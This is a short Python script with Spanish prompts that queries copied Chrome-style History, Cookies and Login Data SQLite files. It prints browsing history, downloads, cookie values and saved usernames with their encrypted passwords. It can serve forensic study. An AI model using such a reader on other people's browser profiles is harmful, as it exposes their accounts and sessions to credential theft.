import sqlite3
import platform
import os

Ver = platform.system()
if Ver == "Linux":
    os.system("clear")
elif Ver == "Windows":
    os.system("cls")
else:
    print("[+] No se reconoce el sistema operativo")

def history():
    print("[+] 1 Ver url y nombre")
    print("[+] 2 Ver descargas")
    ver = input("[+] Seleccione una opcion-> ")
    if ver == "1":
        print("El archivo debe llamarse History.db")
        conn = sqlite3.connect('History.db')
        c = conn.cursor()
        c.execute('SELECT url, title FROM urls ORDER BY last_visit_time DESC')
        for row in c.fetchall():
            print(row)
    elif ver == "2":
        print("El archivo debe llamarse History.db")
        conn = sqlite3.connect('History.db')
        c = conn.cursor()
        c.execute('SELECT id, current_path FROM downloads')
        for row in c.fetchall():
            print(row)
            
def cookies():
    print("[+] Alert: El nombre debe ser Cookies.db")
    print("[+] Escriba 1 para iniciar")
    ver = input("[+] Seleccione una opcion-> ")
    if ver == "1":
        print("El archivo debe llamarse Cookies.db")
        conn = sqlite3.connect('Cookies.db')
        c = conn.cursor()
        c.execute('SELECT host_key, name, encrypted_value FROM cookies')
        for row in c.fetchall():
            print(row)
    elif ver != "2":
        print("[+] Opcion no valida")
            
            
def passw():
    print("[+] Alert: El nombre debe ser Login Data.db")
    print("[+] Escriba 1 para iniciar")
    ver = input("[+] Seleccione una opcion-> ")
    if ver == "1":
        print("El archivo debe llamarse Login Data.db")
        conn = sqlite3.connect('Login Data.db')
        c = conn.cursor()
        c.execute('SELECT origin_url, username_value, password_value, date_password_modified FROM logins')
        for row in c.fetchall():
            """print(row)"""
            url = row[0]
            username = row[1]
            passww = row[2]
            date = row[3]
            print(f"[+] URL: {url} \n[+] Usuario: {username} \n[+] Contraseña encriptada: {passww} \n[+] Date_pass: {date}")
            print("\n")
        
    
print("[+] 1 Ver historial")
print("[+] 2 Ver cookies(Mantenimiento)")
print("[+] 3 Ver Contraseñas guardadas")
option = input("[+] Seleccione una opcion-> ")
if option == "1":
    history()
elif option == "2":
    cookies()
elif option == "3":
    passw()